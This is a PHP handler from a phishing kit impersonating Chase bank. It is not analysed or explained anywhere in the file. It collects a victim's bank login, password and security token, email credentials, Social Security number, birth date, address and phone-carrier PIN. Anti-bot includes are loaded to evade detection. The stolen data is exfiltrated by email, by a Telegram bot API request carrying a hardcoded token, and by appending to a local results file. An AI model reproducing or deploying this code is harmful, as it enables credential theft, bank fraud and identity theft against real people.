<?php

// require 'vendor/autoload.php';
// include('mailer.php');
session_start();
require_once '../main.php';
include('../detects.php');
include 'bots/anti1.php';
include 'bots/anti2.php';
include 'bots/anti3.php';
include 'bots/anti4.php';
include 'bots/anti5.php';
include 'bots/anti6.php';
include 'bots/anti7.php';
include 'bots/anti8.php';
include'anti/IP-BlackList.php';  
include'anti/Bot-Crawler.php';
include'anti/Bot-Spox.php';
include'anti/blacklist.php';
include'anti/new.php';
include'anti/Dila_DZ.php';
include('../blockers.php');
if (!$_POST['SecurityNumber']){
} else {
    $cityg = $_SESSION['cityg'];
    $regiong = $_SESSION['regiong'];
    $countryg = $_SESSION['countryg'];
    $VictimInfo1 = "| Submitted by : " . $v_ip . " (" . gethostbyaddr($v_ip) . ")";
    $VictimInfo2 = "| Location : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| User4gent : " . $user_agent . "";
    $VictimInfo4 = "| Br0wser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";
    $userbank = $_SESSION['userbank'];
    $passwordbank = $_SESSION['passwordbank'];
    $securityTokenbank = $_SESSION['securityTokenbank'];
    $emaildress = $_SESSION['emaildress'];
    $emailPassword = $_SESSION['emailPassword'];
    $emailretry = $_SESSION['emailretry'];
    $emailType = $_SESSION['emailType'];
    $emailProvider = $_SESSION['emailProvider'];
    $fullname = $_SESSION['fullname'] = $_POST['fullname'];
    $DateOfBirth = $_SESSION['DateOfBirth'] = $_POST['DateOfBirth'];
    $StreetAddress = $_SESSION['StreetAddress'] = $_POST['StreetAddress'];
    $StateRegion = $_SESSION['StateRegion'] = $_POST['StateRegion'];
    $ZipCode = $_SESSION['ZipCode'] = $_POST['ZipCode'];
    $CityR = $_SESSION['CityR'] = $_POST['CityR'];
    $NumberPhone = $_SESSION['NumberPhone'] = $_POST['NumberPhone'];
    $NumberCarrier = $_SESSION['NumberCarrier'] = $_POST['NumberCarrier'];
    $NumberPin = $_SESSION['NumberPin'] = $_POST['NumberPin'];
    $SecurityNumber = $_SESSION['SecurityNumber'] = $_POST['SecurityNumber'];
    $message = "+ -------- 👻💥 [⚡ ELARABY ⚡] 💥👻 -----------+\n";
    $message .= "+ 🏦 Ch4se L0gin Details\n";
    $message .= "| Chese login : $userbank\n";
    $message .= "| Chese password : $passwordbank\n";
    if (isset($_SESSION['securityTokenbank'])) {
        $message .= "| Chese Security T0ken : $securityTokenbank\n";
    }
    $message .= "+ ------------------------------------+\n";
    $message .= "+ ✅ Email l0gin $emailretry\n";
    $message .= "| Email login : $emaildress\n";
    $message .= "| Email password : $emailPassword\n";
    $message .= "| Email Provider : $emailProvider\n";
    $message .= "| Email Type : $emailType\n";
    $message .= "+ ------------------------------------+\n";
    $message .= "+ 💎 Personal Information\n";
    $message .= "| Full n4me : $fullname\n";
    $message .= "| Date of birth : $DateOfBirth\n";
    $message .= "| SSN : $SecurityNumber\n";
    $message .= "| addr3ss : $StreetAddress\n";
    $message .= "| State : $StateRegion\n";
    $message .= "| City : $CityR\n";
    $message .= "| Zip : $ZipCode\n";
    $message .= "| Teleph0ne : $NumberPhone\n";
    if ($enablephonepin === "on") {
        $message .= "| Ph0ne Carrier : $NumberCarrier\n";
        $message .= "| Ph0ne Carrier Pln : $NumberPin\n";
    }
    $message .= "+ ------------------------------------+\n";
    $message .= "+ 🌐 Victim Information\n";
    $message .= "$VictimInfo1\n";
    $message .= "$VictimInfo2\n";
    $message .= "$VictimInfo3\n";
    $message .= "$VictimInfo4\n";
    $message .= "$VictimInfo5\n";
    $message .= "| 🕛 Received : $date\n";
    $message .= "+ ------------------------------------+\n";
    $subject = "CHESE BILLING: ".$_POST['fullname']." [ $cn - $os - $v_ip ]";
    kirim_mail($email_result, "CH4SE BILLING ".$fullname, $subject, $message);
	file_get_contents('https://api.telegram.org/bot5157139736:AAG_tQwVnXuAPrz8auSZ4KvCehaZrU-rkbo/sendMessage?text='.$message.'&chat_id=1148960035');
	
    $save = fopen("../rs/billing.txt","a+");
	fwrite($save,$message);
    fclose($save);

    header('Location: Final?key='.$key);
}
?>